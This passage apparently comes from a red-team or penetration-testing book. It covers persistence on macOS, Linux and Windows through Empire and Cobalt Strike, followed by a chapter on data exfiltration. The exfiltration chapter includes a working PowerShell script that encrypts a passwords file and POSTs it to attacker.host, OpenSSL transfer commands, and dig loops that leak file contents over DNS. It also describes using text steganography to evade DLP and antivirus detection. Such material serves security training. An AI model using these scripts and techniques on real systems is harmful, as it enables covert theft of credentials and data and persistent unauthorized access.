# Persistence via Login Hooks on macOS

A login hook in macOS instructs the system to execute a specific script when a user logs in. Unlike startup items, which launch applications upon login, a login hook runs as the root user. For this module, you need to create a script on the target machine and specify its path within the module. The script requires the `sudo` password, which can be obtained through methods discussed in previous chapters. Once you have the password, enter it into the script and execute it as follows:

![](media/image753.jpeg)

Every time a user logs in, you will receive a new agent connection notification on your Empire interface, as shown in the following command:

**For Linux:**

![](media/image755.jpeg)

Linux systems use the `crontab` module to schedule tasks. This creates a cron job that executes your payload at a specified time. As shown in the screenshot below, setting the "Hourly" option to true will run the payload every hour.

![](media/image756.jpeg)

Next, set the filename where the payload will be stored and run the `execute` command to set up the persistence script:

![](media/image757.jpeg)

This will ensure that agents connect to you from the target machine every hour.

## Persistence via Cobalt Strike

In Cobalt Strike, persistence can be achieved using Aggressor Scripts. We covered Aggressor Scripts in previous chapters. Some of these scripts are available on GitHub, and we will use the following one:

![](media/image758.jpeg)

![](media/image759.jpeg)

Download the scripts to your system and import them into your Cobalt Strike client through the script manager, as shown in the screenshot. Here, we loaded the `Persistence_Menu` script, which adds a new entry to the Beacon menu with all the downloaded scripts. These scripts can be accessed by right-clicking on the host, then selecting "Red Team" and "Persistence," as shown below:

![](media/image760.jpeg)

Let's look at an example using the `HKCU Run Registry PowerShell Persistence (User Level)` script. This script creates a registry key for the payload and another key to execute the payload. Clicking on this option opens a new window where you can specify the names of both values, as shown in the screenshot. Upon clicking "Create," a new item will be added to the user's registry, containing our base64-encoded PowerShell payload.

For more information about different scripts, visit:
[https://github.com/harleyQu1nn/AggressorScripts/tree/master/Persistence](https://github.com/harleyQu1nn/AggressorScripts/tree/master/Persistence)

# Summary

In this chapter, we explored achieving persistence using Armitage's inbuilt exploit modules, followed by methods for Windows, Linux, and macOS machines via Empire. Finally, we learned how to persist sessions in Cobalt Strike using Aggressor Scripts.

# Further Reading

For more information on the topics discussed in this chapter, please visit the following links:
- [Volume Shadow Copy Service Overview](https://docs.microsoft.com/en-us/windows/desktop/vss/volume-shadow-copy-service-overview)

# Data Exfiltration

Data exfiltration, also known as data extrusion or data theft, involves unauthorized data transfer from a computer. This can be done either by physically accessing devices in the network or remotely using automated scripts. Advanced Persistent Threats (APTs) often aim to exfiltrate data while remaining undetected.

In this chapter, we will cover the following topics:
- Exfiltration basics
- CloakifyFactory
- Data exfiltration via DNS
- Data exfiltration via Empire

# Technical Requirements

- Metasploit Framework (MSF)
- PostgreSQL (PGSQL)
- Oracle Java 1.7 or later
- Cobalt Strike
- Empire
- Armitage

# Exfiltration Basics

We have already covered some basic techniques in the reverse shell chapter. Let's quickly review how these techniques can be used to transfer data from a victim machine to the attacker.

## Exfiltration via Netcat

As previously discussed, transmitting data using Netcat is not secure because the data is sent in plaintext, making it easily detectable.

![](media/image762.jpeg)

## Exfiltration via OpenSSL

Another method is to use OpenSSL to securely transfer data. First, generate a certificate and then use it to transfer data securely. On the server, run:

```sh
openssl s_server -quiet -key key.pem -cert cert.pem -port 8080
```

On the client, run:

```sh
openssl s_client -quiet -connect <server>:8080
```

![](media/image763.jpeg)

Transferring data over SSL is secure but may not always work if OpenSSL is not installed on the system.

## Exfiltration with PowerShell

On Windows systems, PowerShell can be used to exfiltrate data. This can be done with a few lines of code that encrypt the file content in AES format and send it to the attacker's host using an HTTP POST request. Here is an example:

```powershell
$file = Get-Content C:\Users\PT\Desktop\passwords.txt
$key = (New-Object System.Text.ASCIIEncoding).GetBytes("54b8617eca0e54c7d3c8e6732c6b687a")
$securestring = new-object System.Security.SecureString
foreach ($char in $file.toCharArray()) {
    $secureString.AppendChar($char)
}
$encryptedData = ConvertFrom-SecureString -SecureString $secureString -Key $key
Invoke-WebRequest -Uri http://attacker.host/exfil -Method POST -Body $encryptedData
```

The HTTP request will look like this:

```http
POST /exfil HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 6.3; en-GB) WindowsPowerShell/4.0
Content-Type: application/x-www-form-urlencoded
Host: www.attacker.host
Content-Length: 704
Expect: 100-continue
Connection: Keep-Alive
encrypteddatahere
```

To decrypt the data on the server side, use the following code:

```powershell
$key = (New-Object System.Text.ASCIIEncoding).GetBytes("54b8617eca0e54c7d3c8e6732c6b687a")
$encrypted = "encrypteddatahere"
echo $encrypted | ConvertTo-SecureString -key $key | ForEach-Object { [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($_)) }
```

# CloakifyFactory

CloakifyFactory, developed by Joe Gervais (TryCatchHCF), was presented at DEF CON 24. It uses text-based steganography to hide data in plain sight, bypassing data loss prevention (DLP), whitelisting controls, and antivirus (AV) detection.

Steganography is the art of hiding a message within another so that the presence of the hidden message is indistinguishable. Text steganography uses text as a cover medium for hiding a message, requiring less memory and simpler communication compared to other steganographic techniques.

CloakifyFactory is open source and can be downloaded from GitHub. To use it, clone the repository and run:

```sh
python cloakifyFactory.py
```

![](media/image764.jpeg)

The tool provides options for usage. To view the help, type `5` and press Enter. This will display the help and basic usage instructions:

![](media/image765.jpeg)
![](media/image766.jpeg)

To cloak a file, select option `1` and specify the input and output filenames. Choose a cipher from the 24 inbuilt ciphers, such as `belgianBeers`:

![](media/image767.jpeg)

Add noise to degrade frequency analysis attacks, or encrypt the file before cloaking for absolute secrecy. The preview of the cloaked file will show a list of beers:

![](media/image768.jpeg)
![](media/image769.jpeg)

To decloak the file, run the tool again, choose option `2`, and enter the file and output filenames. Select the same cipher used for cloaking:

![](media/image770.jpeg)
![](media/image771.jpeg)

The output file will be the original `/etc/passwd` file:

![](media/image772.jpeg)

For standalone use, use `cloakify.py` with the command:

```sh
python cloakify.py filename ciphername
```

![](media/image773.jpeg)

To decloak, use:

```sh
python decloakify.py cloakedfile ciphername
```

![](media/image774.jpeg)

# Running CloakifyFactory on Windows

Python is not always available on Windows servers, but `cloakify.py` can be compiled into a standalone executable. Upload and run the executable on the system:

![](media/image775.jpeg)
![](media/image776.jpeg)
![](media/image777.jpeg)
![](media/image778.jpeg)

Save the output to a file and exfiltrate it to your C2, where you can decloak it to view the contents.

# Data Exfiltration via DNS

Data exfiltration can also be done over DNS to avoid detection. DNSteal is a tool that creates a fake DNS server to listen for DNS requests. On the client, use simple for loops to transfer file data. The tool supports single and multiple file transfers.

Download the tool and run:

```sh
python dnsteal.py
```

![](media/image779.jpeg)

This starts the server, listening on port 53 for incoming connections. Use the provided command on *nix-based systems to exfiltrate data:

![](media/image780.jpeg)

The file will be received on the server:

![](media/image781.jpeg)

Once the transfer is complete, press `Ctrl + C` to exit the server and save the file:

![](media/image782.jpeg)

Other commands for transferring data include:

```sh
for b in $(xxd -p file/to/send); do dig @serverIP $b.filename.com; done
```

To send multiple files, use:

```sh
for filename in $(ls); do for a in $(xxd -p $f); do dig +short @serverIP %a.$filename.com; done
```

# Data Exfiltration via Empire

Empire has a built-in module to upload data directly to Dropbox, useful in environments with IP whitelisting.